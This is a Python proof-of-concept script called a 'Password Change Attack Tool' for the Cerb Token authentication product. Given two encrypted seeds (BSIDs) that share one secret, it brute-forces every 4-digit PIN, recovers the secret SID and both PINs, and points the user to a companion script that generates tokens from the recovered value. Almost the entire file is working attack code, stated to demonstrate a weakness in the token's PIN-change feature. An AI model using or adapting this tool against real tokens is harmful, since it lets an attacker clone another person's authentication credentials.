#!/usr/bin/env python3
#
# THIS LOOKS LIKE SHIT AND THAT'S A FEATURE.
# AS A HIGH-LEVEL INTERFACE TO GRUMPY TOKEN FRAMEWORK, IT IS AN EXAMPLE OF USE.

import argparse
from Specific.Wheel import BSIDcoder
from Helper import Clock, Grum
from binascii import b2a_hex
from sys import exit
from itertools import product

desctxt = "Grumpy token v.{} (C) 2014: poc@rozbicki.eu".format(Grum.version)
epitxt = """Password Change Attack Tool.
If same SID has been used to create 2 different BSIDs (using different PINs),
this utility will compute the original SID and both PINs in a matter of
seconds. Primary use of this tool is to demonstrate the risk regarding PIN
change feature in Cerb Token."""

parser = argparse.ArgumentParser(epilog=epitxt, description=desctxt)

parser.add_argument("-v", "--verbose", help="increase output verbosity",
                    action="count")
parser.add_argument("-q", "--quiet", help="be quiet, output only sid value",
                    action="store_true")
parser.add_argument("bsid1", help="BSID 1 (PIN1 encrypted SID)")
parser.add_argument("bsid2", help="BSID 2 (PIN2 encrypted SID)")
args = parser.parse_args()

bsid1 = args.bsid1
bsid2 = args.bsid2

HASHBASE = {}
CHARS = '0123456789'

verbose = args.verbose
if not verbose:
    verbose = 0

if args.quiet:
    verbose = -1


def Decrypt(bsid, pin):
    B = BSIDcoder.BSIDcoder()
    sid = B.Decode(bsid, pin)
    return sid


def MakeHashbase(bsid):
    to_attempt = product(CHARS, repeat=4)
    for attempt in to_attempt:
        pin = ''.join(attempt)
        sid = Decrypt(bsid, pin)
        HASHBASE[sid] = pin


def FindTheFinalSolution(bsid):
    to_attempt = product(CHARS, repeat=4)
    for attempt in to_attempt:
        pin = ''.join(attempt)
        sid = Decrypt(bsid, pin)
        try:
            firstpin = HASHBASE[sid]
            sid = b2a_hex(sid).decode('utf-8')
            return sid, firstpin, pin
        except KeyError:
            ""
    if verbose > -1:
        print("ERROR: Match not found!")
        print("""BSIDs don't share the same plaintext
(SID) or the better PIN code was used.'""")
    exit(-1)


def Compute(bsid1, bsid2):
    if bsid1 == bsid2:
        raise Exception("Two different BSIDs have to be given.")
    MakeHashbase(bsid1)
    return FindTheFinalSolution(bsid2)

T = Clock.Clock()
T.TimerStart()
sid, pin1, pin2 = Compute(bsid1, bsid2)
secs = T.TimerGet()

if verbose == -1:
    print(sid)
else:
    print("")
    print("SID:\t{}".format(sid))
    print("PIN1:\t{}".format(pin1))
    print("PIN2:\t{}".format(pin2))
    print("")
    print("Decrypted in {} seconds.".format(secs))
    print("Now you can generate token with wheel.py -s [SID]")